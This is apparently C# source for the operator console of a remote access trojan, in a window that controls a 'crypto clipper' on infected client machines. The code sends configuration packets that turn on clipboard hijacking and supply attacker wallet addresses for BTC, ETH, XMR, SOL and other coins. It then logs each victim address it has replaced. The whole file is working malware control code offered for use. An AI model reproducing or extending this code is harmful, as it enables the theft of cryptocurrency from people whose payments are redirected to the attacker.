using System.Windows;
using DevExpress.Xpf.Core;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class CryptoClipperWindow : ThemedWindow
{
    private readonly TlsServer _server;
    private readonly string    _clientId;
    private int                _totalCount;

    public CryptoClipperWindow(TlsServer server, string clientId, string clientLabel)
    {
        InitializeComponent();
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text = clientLabel;

        _server.RegisterHandler(clientId, PacketType.ClipperStatsResult, OnStatsResult);
        _server.RegisterHandler(clientId, PacketType.ClipperDetected,    OnDetected);

        Lang.LanguageChanged += ApplyLanguage;
        ApplyLanguage();
        Closed += (_, _) =>
        {
            _server.UnregisterHandler(clientId, PacketType.ClipperStatsResult);
            _server.UnregisterHandler(clientId, PacketType.ClipperDetected);
            Lang.LanguageChanged -= ApplyLanguage;
        };

        // Request current stats on open (staggered)
        Loaded += async (_, _) =>
        {
            await Task.Delay(Random.Shared.Next(0, 250));
            await _server.SendToClient(_clientId, new Packet { Type = PacketType.ClipperGetStats });
        };
    }

    // ── Incoming ────────────────────────────────────────────────────────────

    private void ApplyLanguage() { this.Title = Lang.Get("FEAT_CRYPTO_CLIPPER"); }

    private void OnStatsResult(Packet pkt)
    {
        var data = JsonConvert.DeserializeObject<ClipperStatsResultData>(pkt.Data);
        if (data == null) return;
        Dispatcher.BeginInvoke(() =>
        {
            ChkEnabled.IsChecked = data.Enabled;
            BadgeActive.Visibility = data.Enabled ? Visibility.Visible : Visibility.Collapsed;
            _totalCount = data.Count;
            TxtCount.Text = $"{_totalCount} {Lang.Get("RECORDS_COUNT")}";
            TxtStatus.Text = data.Enabled ? Lang.Get("CLIPPER_IS_ACTIVE") : Lang.Get("CLIPPER_IS_DISABLED");
        });
    }

    private void OnDetected(Packet pkt)
    {
        var data = JsonConvert.DeserializeObject<ClipperDetectedData>(pkt.Data);
        if (data == null) return;
        Dispatcher.BeginInvoke(() =>
        {
            _totalCount++;
            TxtCount.Text = $"{_totalCount} {Lang.Get("RECORDS_COUNT")}";
            var line = $"[{DateTime.Now:h:mm tt}]  {data.Type}  {data.Original[..Math.Min(data.Original.Length, 20)]}…  →  {data.Replaced}\n";
            TxtLog.AppendText(line);
            LogScroll.ScrollToEnd();

            TxtStatus.Text = $"Replaced {data.Type} address ({_totalCount} total)";
        });
    }

    // ── Apply config ────────────────────────────────────────────────────────

    private async void BtnApply_Click(object s, RoutedEventArgs e)
    {
        var cfg = new ClipperSetConfigData
        {
            Enabled   = ChkEnabled.IsChecked == true,
            Addresses = new ClipperAddresses
            {
                BTC  = AddrBTC.Text.Trim(),
                ETH  = AddrETH.Text.Trim(),
                LTC  = AddrLTC.Text.Trim(),
                TRX  = AddrTRX.Text.Trim(),
                SOL  = AddrSOL.Text.Trim(),
                XMR  = AddrXMR.Text.Trim(),
                XRP  = AddrXRP.Text.Trim(),
                DASH = AddrDASH.Text.Trim(),
                BCH  = AddrBCH.Text.Trim(),
            }
        };

        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.ClipperSetConfig,
            Data = JsonConvert.SerializeObject(cfg)
        });

        BadgeActive.Visibility = cfg.Enabled ? Visibility.Visible : Visibility.Collapsed;
        TxtStatus.Text = cfg.Enabled ? Lang.Get("CLIPPER_ACTIVATED") : Lang.Get("CLIPPER_DEACTIVATED");
        var status = cfg.Enabled ? "activated" : "disabled";
        ServerWindow.ReportGlobalActivity("Configure Clipper", status, "complete");
        ServerWindow.LogGlobal($"[CLIPPER] Clipper {status} for client {_clientId}.");
    }

    private void ChkEnabled_Changed(object s, RoutedEventArgs e)
    {
        BadgeActive.Visibility = (ChkEnabled.IsChecked == true) ? Visibility.Visible : Visibility.Collapsed;
    }

    private async void BtnStats_Click(object s, RoutedEventArgs e)
    {
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.ClipperGetStats });
        TxtStatus.Text = Lang.Get("STATUS_REFRESHING");
    }

    private void BtnClearLog_Click(object s, RoutedEventArgs e)
    {
        TxtLog.Clear();
        _totalCount = 0;
        TxtCount.Text = $"0 {Lang.Get("RECORDS_COUNT")}";
    }

    private void Close_Click(object s, RoutedEventArgs e) => Close();
}
